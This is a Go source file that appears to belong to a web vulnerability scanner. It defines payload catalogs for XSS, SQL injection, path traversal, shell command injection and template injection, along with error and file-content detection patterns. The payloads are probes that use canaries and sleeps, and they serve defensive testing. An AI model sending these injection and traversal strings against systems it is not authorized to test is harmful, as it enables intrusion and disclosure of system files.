package checks

import (
	"strconv"
	"strings"
)

// PayloadClass groups crafted inputs that share a detection strategy. Active
// checks select a class, render each payload with their own canary, send it
// through a Sink.MutateRequest, and apply the class-appropriate detector
// (reflection for XSS, status/length oracle for SQLi-boolean, latency oracle
// for SQLi-time, content match for traversal, etc.).
type PayloadClass string

const (
	// PayloadXSS - HTML/attribute/JS-string context breakouts that contain
	// a {{TOKEN}} marker so the reflection detector can spot the echo and
	// classify where on the page it landed.
	PayloadXSS PayloadClass = "xss"
	// PayloadSQLiError - inputs that should provoke a database driver
	// error if the parameter is concatenated into a SQL statement. Pair
	// with SQLErrorPatterns to scan the response body for known error
	// signatures.
	PayloadSQLiError PayloadClass = "sqli-error"
	// PayloadSQLiTime - inputs that include a {{SLEEP}} placeholder
	// resolving to a dialect-specific sleep call. Pair with TimingCompare
	// against a baseline latency.
	PayloadSQLiTime PayloadClass = "sqli-time"
	// PayloadTraversal - canonical "../" escapes plus common encodings.
	// Pair with TraversalMarkers (e.g. "root:x:") to confirm a sensitive
	// file was disclosed.
	PayloadTraversal PayloadClass = "traversal"
	// PayloadCmdInject - shell metacharacter prefixes that chain a sleep
	// onto an inferred backend command. {{SLEEP}} expands to the chosen
	// duration in seconds; detect via TimingCompare.
	PayloadCmdInject PayloadClass = "cmd-injection"
	// PayloadCmdInjectBlind - shell metacharacter prefixes that trigger
	// command execution errors. {{TOKEN}} expands to a canary; detect via
	// error pattern matching. Complements timing-based CmdInjection by
	// catching blind RCE in contexts where timing is unreliable.
	PayloadCmdInjectBlind PayloadClass = "cmd-injection-blind"
)

// Placeholder tokens inside Payload.Template. Render substitutes them at call
// time so each check controls its own canary value and sleep duration.
const (
	tokenPlaceholder = "{{TOKEN}}"
	sleepPlaceholder = "{{SLEEP}}"
)

// Payload is one crafted input for an active check.
//
// Name is a short label that rides into Finding evidence so the report can
// say "payload xss/attr-double-break fired" instead of just dumping the raw
// string. Template is the wire form with {{TOKEN}} / {{SLEEP}} placeholders
// resolved by Render. Class is the family the payload belongs to; checks
// should call PayloadsFor(class) rather than building lists inline.
type Payload struct {
	Class    PayloadClass
	Name     string
	Template string
}

// Render returns p.Template with placeholders substituted. token replaces
// {{TOKEN}} (pass NewCanary() at the call site); sleepSecs replaces
// {{SLEEP}} with the literal integer when > 0. A template that does not
// carry a placeholder returns Template unchanged.
//
// sleepSecs is an int (not time.Duration) because every backend's sleep
// primitive takes a whole-second integer literal; passing a Duration would
// invite ".Seconds() rounding" landmines at call sites.
func (p Payload) Render(token string, sleepSecs int) string {
	out := p.Template
	if strings.Contains(out, tokenPlaceholder) {
		out = strings.ReplaceAll(out, tokenPlaceholder, token)
	}
	if sleepSecs > 0 && strings.Contains(out, sleepPlaceholder) {
		out = strings.ReplaceAll(out, sleepPlaceholder, strconv.Itoa(sleepSecs))
	}
	return out
}

// SQLiBooleanPair is a truthy/falsy probe pair. The two strings differ only
// in their boolean tail: a SQL-injectable parameter renders the truthy
// variant identical to the unmodified baseline and the falsy variant
// different. Boolean SQLi detection is intrinsically paired - the oracle
// needs both halves at once - so this stays separate from Payload.
//
// True is appended to the existing parameter value (e.g. given id=1, the
// wire value becomes "1' AND '1'='1"). False is its negated twin. The
// callsite is responsible for stitching the original value onto the front
// when the parameter is not already trivially clobberable.
type SQLiBooleanPair struct {
	Name  string
	True  string
	False string
}

// PayloadsFor returns a copy of the curated payload list for class. The
// slice is freshly allocated on each call so the caller may filter or
// reorder it without affecting other checks. An unknown class returns nil.
func PayloadsFor(class PayloadClass) []Payload {
	src := payloadCatalog[class]
	if src == nil {
		return nil
	}
	out := make([]Payload, len(src))
	copy(out, src)
	return out
}

// SQLiBooleanPairs returns a copy of the curated truthy/falsy probe pairs
// for boolean SQL injection. Curated rather than exhaustive: each pair
// targets a distinct injection context (string-quoted, numeric, comment-
// terminated) and any additional pairs would just duplicate signal.
func SQLiBooleanPairs() []SQLiBooleanPair {
	out := make([]SQLiBooleanPair, len(sqliBooleanPairs))
	copy(out, sqliBooleanPairs)
	return out
}

// SQLErrorPatterns returns lower-cased substrings that, when found in a
// response body, indicate a database driver leaked an error. Curated to
// cover the major engines (MySQL/MariaDB, PostgreSQL, MSSQL, Oracle,
// SQLite) without overlapping into generic words. Caller should lowercase
// the response body before checking.
func SQLErrorPatterns() []string {
	out := make([]string, len(sqlErrorPatterns))
	copy(out, sqlErrorPatterns)
	return out
}

// TraversalMarkers returns the content needles a successful path-traversal
// disclosure would contain. Pair the returned strings with the response
// body: any match confirms the traversal landed on the intended sensitive
// file. Curated to cross-platform staples (Linux /etc/passwd shape,
// Windows Hosts file shape) so the markers fire on either OS.
func TraversalMarkers() []string {
	out := make([]string, len(traversalMarkers))
	copy(out, traversalMarkers)
	return out
}

// payloadCatalog is the source of truth for non-paired payloads. Keep entries
// terse and class-tagged so PayloadsFor can serve them with a single map
// lookup. New entries should be deliberately curated: every additional
// payload is one more request per probed sink.
var payloadCatalog = map[PayloadClass][]Payload{
	PayloadXSS: {
		// HTML text context: appears between tags. A working <svg> tag
		// inside the body is a clear smoking gun for the reflection
		// detector even without execution.
		{Class: PayloadXSS, Name: "html-svg-onload", Template: `<svg onload=alert("{{TOKEN}}")>`},
		{Class: PayloadXSS, Name: "html-img-onerror", Template: `<img src=x onerror=alert("{{TOKEN}}")>`},
		// Double-quoted attribute breakout. `">` closes the attribute and
		// the tag, leaving free HTML for our payload.
		{Class: PayloadXSS, Name: "attr-double-break", Template: `"><svg onload=alert("{{TOKEN}}")>`},
		// Single-quoted attribute breakout. Same shape with `'`.
		{Class: PayloadXSS, Name: "attr-single-break", Template: `'><svg onload=alert("{{TOKEN}}")>`},
		// Unquoted attribute breakout. Inside `<a href=VALUE>` the parser
		// stays in attribute-value-unquoted state until whitespace or `>`,
		// so a bare `<svg ...>` doesn't form a tag - we close the host tag
		// with `>` first, then inject.
		{Class: PayloadXSS, Name: "attr-unquoted-break", Template: `><svg onload=alert("{{TOKEN}}")>`},
		// JS double-quoted string breakout. `";` closes the string and
		// inserts a new statement; `//` swallows whatever the original
		// source had after our injection point.
		{Class: PayloadXSS, Name: "js-string-double-break", Template: `";alert("{{TOKEN}}");//`},
		// JS single-quoted string breakout.
		{Class: PayloadXSS, Name: "js-string-single-break", Template: `';alert("{{TOKEN}}");//`},
		// Bare JS for reflection landing in raw <script> text (not inside
		// a string literal). Leading `;` safely terminates whatever
		// statement or expression precedes the injection; `//` swallows
		// the trailing source.
		{Class: PayloadXSS, Name: "js-bare-break", Template: `;alert("{{TOKEN}}");//`},
	},
	PayloadSQLiError: {
		// Single quotes are by far the most common dialect break: any
		// unparameterized concatenation of user input into a quoted SQL
		// literal will produce a parse error here.
		{Class: PayloadSQLiError, Name: "single-quote", Template: `'`},
		{Class: PayloadSQLiError, Name: "double-quote", Template: `"`},
		{Class: PayloadSQLiError, Name: "backtick", Template: "`"},
		// Tautology-with-quote: forces a quote AND a syntax shape some
		// engines accept up to the trailing token, surfacing different
		// errors than the bare quote.
		{Class: PayloadSQLiError, Name: "single-quote-or-one", Template: `' OR '1'='1`},
		{Class: PayloadSQLiError, Name: "numeric-or-one", Template: ` OR 1=1`},
		// Type-cast error: convert('a' to int) raises a clear,
		// engine-specific message that error patterns easily catch.
		{Class: PayloadSQLiError, Name: "convert-int", Template: `1' AND 1=convert(int,'a')-- -`},
	},
	PayloadSQLiTime: {
		// MySQL / MariaDB - SLEEP() in a quoted-string context.
		{Class: PayloadSQLiTime, Name: "mysql-quoted-sleep", Template: `' AND SLEEP({{SLEEP}})-- -`},
		// MySQL numeric context: when the param is concatenated as a
		// bare integer.
		{Class: PayloadSQLiTime, Name: "mysql-numeric-sleep", Template: ` AND SLEEP({{SLEEP}})-- -`},
		// PostgreSQL - pg_sleep returns void; combine via OR so the parse
		// path still produces a row.
		{Class: PayloadSQLiTime, Name: "postgres-quoted-pg_sleep", Template: `' AND pg_sleep({{SLEEP}})-- -`},
		{Class: PayloadSQLiTime, Name: "postgres-numeric-pg_sleep", Template: ` AND pg_sleep({{SLEEP}})-- -`},
		// MSSQL - WAITFOR DELAY accepts an HH:MM:SS literal, not a
		// parameter, so it has to be assembled inline.
		{Class: PayloadSQLiTime, Name: "mssql-waitfor", Template: `'; WAITFOR DELAY '0:0:{{SLEEP}}'-- -`},
		// Stacked queries (MySQL via mysqli, etc.) - separate statement
		// with a sleep.
		{Class: PayloadSQLiTime, Name: "stacked-sleep", Template: `'; SELECT SLEEP({{SLEEP}})-- -`},
	},
	PayloadTraversal: {
		// Raw traversal: works against handlers that resolve paths
		// without normalization.
		{Class: PayloadTraversal, Name: "etc-passwd", Template: `../../../../etc/passwd`},
		// URL-encoded slashes: bypasses naive "../" string filters.
		{Class: PayloadTraversal, Name: "etc-passwd-url-encoded", Template: `..%2f..%2f..%2f..%2fetc%2fpasswd`},
		// Double-encoded: bypasses single-pass decoders.
		{Class: PayloadTraversal, Name: "etc-passwd-double-encoded", Template: `..%252f..%252f..%252fetc%252fpasswd`},
		// Nested "..../" form bypasses sequential-replace filters that
		// strip "../" once.
		{Class: PayloadTraversal, Name: "etc-passwd-nested-dotdot", Template: `....//....//....//etc/passwd`},
		// Null byte: classic C-string termination trick still effective
		// against some PHP / older runtimes.
		{Class: PayloadTraversal, Name: "etc-passwd-nullbyte", Template: `../../../../etc/passwd%00`},
		// Windows variant: the hosts file is the cross-platform analog
		// of /etc/passwd and is readable to any process.
		{Class: PayloadTraversal, Name: "windows-hosts", Template: `..\..\..\..\windows\system32\drivers\etc\hosts`},
	},
	PayloadCmdInject: {
		// POSIX unquoted-arg context: `; sleep N` chains a new statement
		// onto the host command. && / | were dropped from this list - they
		// detect the same "concat into unquoted shell arg" capability and
		// just multiply request count on non-vulnerable sinks.
		{Class: PayloadCmdInject, Name: "semicolon-sleep", Template: `; sleep {{SLEEP}}`},
		// Backtick + $() substitution: detonate inside double-quoted
		// shell arguments where bare ; / && would be quoted out. Both
		// kept because legacy /bin/sh strips $() while bash strips
		// nothing, so each covers a real-world parser the other misses.
		{Class: PayloadCmdInject, Name: "backtick-sleep", Template: "`sleep {{SLEEP}}`"},
		{Class: PayloadCmdInject, Name: "dollar-paren-sleep", Template: `$(sleep {{SLEEP}})`},
		// Windows analog: ping -n N implements a ~N-second delay
		// without needing a sleep binary.
		{Class: PayloadCmdInject, Name: "windows-ping-delay", Template: `& ping -n {{SLEEP}} 127.0.0.1`},
	},
	PayloadCmdInjectBlind: {
		// POSIX unquoted-arg context: execute a nonexistent command to
		// trigger "command not found" error. The {{TOKEN}} canary is
		// embedded to anchor the injection proof: both canary presence
		// AND error signature must fire to confirm RCE.
		{Class: PayloadCmdInjectBlind, Name: "semicolon-badcmd", Template: `; {{TOKEN}} nonexistent_cmd_xyzabc`},
		// Subshell variant: backtick substitution with invalid command.
		{Class: PayloadCmdInjectBlind, Name: "backtick-badcmd", Template: "`{{TOKEN}} nonexistent_cmd_xyzabc`"},
		// Dollar-paren substitution variant.
		{Class: PayloadCmdInjectBlind, Name: "dollar-paren-badcmd", Template: `$({{TOKEN}} nonexistent_cmd_xyzabc)`},
		// Windows cmd.exe analog: reference undefined variable to trigger
		// syntax/execution error.
		{Class: PayloadCmdInjectBlind, Name: "windows-badcmd", Template: `& {{TOKEN}} & nonexistent_cmd_xyzabc`},
		// Alternative POSIX: pipe to invalid command.
		{Class: PayloadCmdInjectBlind, Name: "pipe-badcmd", Template: `| {{TOKEN}} nonexistent_cmd_xyzabc`},
		// AND chain variant - another unquoted context.
		{Class: PayloadCmdInjectBlind, Name: "and-badcmd", Template: `&& {{TOKEN}} nonexistent_cmd_xyzabc`},
	},
}

// sqliBooleanPairs is the curated truthy/falsy probe set. Each entry pins
// one injection context: bare string-quoted, bare numeric, and a comment-
// terminated form that survives extra characters trailing the parameter.
var sqliBooleanPairs = []SQLiBooleanPair{
	{
		Name:  "string-quoted",
		True:  `' AND '1'='1`,
		False: `' AND '1'='2`,
	},
	{
		Name:  "string-quoted-comment",
		True:  `' AND '1'='1'-- -`,
		False: `' AND '1'='2'-- -`,
	},
	{
		Name:  "numeric",
		True:  ` AND 1=1`,
		False: ` AND 1=2`,
	},
	{
		Name:  "numeric-comment",
		True:  ` AND 1=1-- -`,
		False: ` AND 1=2-- -`,
	},
}

// sqlErrorPatterns are lowercase substrings that fire on common driver-error
// signatures. Keep entries narrow enough that they cannot match well-formed
// English content (e.g. don't add bare "error" or "syntax").
var sqlErrorPatterns = []string{
	// MySQL / MariaDB
	"you have an error in your sql syntax",
	"warning: mysql",
	"mysqlclient.",
	"mysql_fetch",
	"mariadb server version",
	"unclosed quotation mark after the character string",
	// PostgreSQL
	"pg_query():",
	"postgresql query failed",
	"unterminated quoted string at or near",
	"pg::syntaxerror",
	// MSSQL
	"microsoft sql server",
	"odbc sql server driver",
	"sqlserverexception",
	"incorrect syntax near",
	"unclosed quotation mark before the character string",
	// Oracle
	"ora-00933",
	"ora-00921",
	"ora-00936",
	"oracle error",
	"oci_execute",
	// SQLite
	"sqlite_error",
	"sqlite3.operationalerror",
	"unrecognized token:",
	// Generic JDBC / ADO traces with a SQL state code shape.
	"sqlstate[",
	"java.sql.sqlexception",
}

// traversalMarkers are content needles that prove a sensitive file was
// disclosed via path traversal. Cross-platform by design: every probe sweep
// includes both /etc/passwd and the Windows hosts shape so the same code
// path catches either OS without callsite branching.
var traversalMarkers = []string{
	// /etc/passwd: each line is "user:x:uid:gid:gecos:home:shell". The
	// "root:x:" prefix is universally present and short enough not to
	// match prose.
	"root:x:0:0:",
	// Windows hosts file: the file ships with a localhost comment block.
	"# Copyright (c) 1993-2009 Microsoft Corp.",
	"127.0.0.1       localhost",
}

// SSTIProbe is one expression-evaluation probe for SSTI detection. Template
// uses {{TOKEN}} as a context marker flanking the engine expression; render by
// replacing {{TOKEN}} with a fresh canary so the check searches for
// canary+Expected+canary in the response - the evaluated result proves
// template execution, and the canary anchors it.
type SSTIProbe struct {
	Name     string
	Template string
	Expected string
}

// SSTIExprProbes returns evaluation probes for major template engine families.
// Each probe uses a canary-flanked math expression; a match confirms the
// engine evaluated the expression rather than reflecting it verbatim.
func SSTIExprProbes() []SSTIProbe {
	out := make([]SSTIProbe, len(sstiExprProbes))
	copy(out, sstiExprProbes)
	return out
}

// SSTIErrorPatterns returns lowercase substrings that, found in a response
// body, indicate a template engine leaked a parse/execution error.
// Caller should lowercase the body before matching.
func SSTIErrorPatterns() []string {
	out := make([]string, len(sstiErrorPatterns))
	copy(out, sstiErrorPatterns)
	return out
}

// Every SSTIProbe template pivots on the literal "7*7" so a follow-up probe
// can derive a fresh expression in the same engine syntax by string-replacing
// the operands - see SSTI.confirmProbe. Keep this invariant when adding new
// probes: include "7*7" verbatim in Template and "49" as Expected.
var sstiExprProbes = []SSTIProbe{
	// Jinja2 (Python), Twig (PHP), Tornado (Python), Pebble (Java)
	{Name: "jinja2-twig", Template: `{{TOKEN}}{{7*7}}{{TOKEN}}`, Expected: "49"},
	// FreeMarker (Java), Mako (Python), Spring EL
	{Name: "freemarker", Template: `{{TOKEN}}${7*7}{{TOKEN}}`, Expected: "49"},
	// ERB (Ruby on Rails)
	{Name: "erb", Template: `{{TOKEN}}<%= 7*7 %>{{TOKEN}}`, Expected: "49"},
	// Smarty (PHP) - single-brace syntax
	{Name: "smarty", Template: `{{TOKEN}}{7*7}{{TOKEN}}`, Expected: "49"},
	// Velocity (Apache) - #set directive
	{Name: "velocity", Template: `{{TOKEN}}#set($x=7*7)$x{{TOKEN}}`, Expected: "49"},
	// Thymeleaf (Spring/Java) - inline expression
	{Name: "thymeleaf", Template: `{{TOKEN}}[[${7*7}]]{{TOKEN}}`, Expected: "49"},
	// Ruby string interpolation (outside template engines)
	{Name: "ruby-interp", Template: `{{TOKEN}}#{7*7}{{TOKEN}}`, Expected: "49"},
	// Razor (ASP.NET) - @() expression syntax
	{Name: "razor", Template: `{{TOKEN}}@(7*7){{TOKEN}}`, Expected: "49"},
}

var sstiErrorPayloads = []string{
	`{{`,
	`${`,
	`<%`,
}

var sstiErrorPatterns = []string{
	"jinja2.exceptions",
	"templatesyntaxerror",
	"(erb):",
	"actionview::template::error",
	"freemarker.core",
	"freemarker.template",
	"org.apache.velocity",
	"velocityexception",
	"smarty error",
	"smarty_internal",
	"com.mitchellbosecke.pebble",
	"org.thymeleaf.exceptions",
	"mako.exceptions",
	"twig\\error",
	"tornado.template",
	"django.template.exceptions",
	"system.web.razor",
	"razorengine.templating",
}
